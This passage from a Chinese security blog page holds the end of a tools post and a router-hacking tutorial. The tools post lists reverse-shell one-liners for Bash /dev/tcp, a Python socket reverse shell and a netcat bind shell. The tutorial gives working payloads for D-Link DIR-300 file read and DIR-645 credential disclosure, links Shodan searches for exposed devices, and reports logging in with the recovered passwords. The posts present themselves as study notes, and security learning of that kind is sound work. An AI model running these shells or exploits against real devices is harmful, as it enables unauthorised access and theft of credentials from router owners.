<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>python反向shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
<p>Bind Shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Tools/">Tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/11/01/路由器漏洞挖掘入门/"><span>路由器漏洞挖掘入门</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/11/01/路由器漏洞挖掘入门/" rel="bookmark">
        <time class="entry-date published" datetime="2018-11-01T15:19:08.000Z">
          2018-11-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>周末在家闲着，也趁着这个时间来入门学习下路由器漏洞挖掘！网上查阅的D-Link系列的漏洞也不少，那就从D-Link路由器漏洞开始学习，顺便刚好也好跟着<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇paper</a>学习，就当是学习笔记了！</p>
<h4 id="一：准备工作"><a href="#一：准备工作" class="headerlink" title="一：准备工作"></a>一：准备工作</h4><ul>
<li><code>binwalk</code>:用来解开固件包</li>
<li>路由器的固件：<a href="ftp://ftp2.dlink.com/PRODUCTS/" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/</a></li>
</ul>
<p>完成<code>binwalk</code>的安装后，”<code>binwalk -Me</code> 固件包名称”来解相对应的固件。</p>
<h4 id="二：漏洞挖掘"><a href="#二：漏洞挖掘" class="headerlink" title="二：漏洞挖掘"></a>二：漏洞挖掘</h4><p>D-Link DIR-300 信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-300" target="_blank" rel="noopener">shodan :DIR-300</a></p>
<p>我们先下载<code>D-Link DIR-300</code>的固件并且解固件</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/1.PNG" alt=""></p>
<p>在解固件之后，进入 <code>suashfs-root/www</code> 文件夹，漏洞出现在<code>/model/__show_info.php</code>文件。</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/2.PNG" alt=""></p>
<p>这里看到已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。这样的话看起来我们是无法获取账号密码的。那如果我们从根路径开始配置<code>httpasswd</code>的路径，那么是不是就可以绕过这个过滤了呢！</p>
<p>payload：（<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇</a>）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/model/__show_info.php?REQUIRE_FILE=/<span class="keyword">var</span>/etc/httpasswd</span><br></pre></td></tr></table></figure>
<p>这里设置<code>REQUIRE_FILE=/var/etc/httpasswd</code> 成功绕过上面的 <code>if</code>判断，进行任意文件读取。</p>
<p>D-Link DIR-645信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-645" target="_blank" rel="noopener">shodan:DIR-645</a></p>
<p>同样该漏洞出现在 <code>suashfs-root/htdocs</code> 文件夹<code>getcfg.php</code> 文件由于过滤不严格导致信息泄露漏洞</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/5.PNG" alt=""></p>
<p>该代码中 <code>$GETCFG_SVC</code> 没有任何过滤直接获取了 POST 传递过来的<code>SERVICES</code>的值。如果<code>$GETCFG_SVC</code>不为空，则进行文件读取。这里我们就可以读取存储此设备信息的<code>DEVICE.ACCOUNT.xml.php</code>文件。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/getcfg.php</span><br><span class="line">post:SERVICES=DEVICE.ACCOUNT</span><br></pre></td></tr></table></figure>
<p>说了这么久了，实战走一波吧！</p>
<p>进入D-Link DIR-645的web登录页面，则显示需要用户与密码则可登录，那么接下来我们来获取他们</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/6.PNG" alt=""></p>
<p>利用payload打一波</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/3.PNG" alt=""></p>
<p>果然，我们可以清楚地看到账号密码，继续登录验证，登录成功</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/4.PNG" alt=""></p>
<h4 id="三：参考"><a href="#三：参考" class="headerlink" title="三：参考"></a>三：参考</h4><p>【1】<a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf" target="_blank" rel="noopener">.http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf</a></p>
<p>【2】<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">https://paper.seebug.org/429/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/漏洞挖掘/">漏洞挖掘</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 fanson
    
  </p>
</footer>
    
  </div>
</div>
<script type="text/javascript" src="/js/src/love.js"></script>
</body>
</html>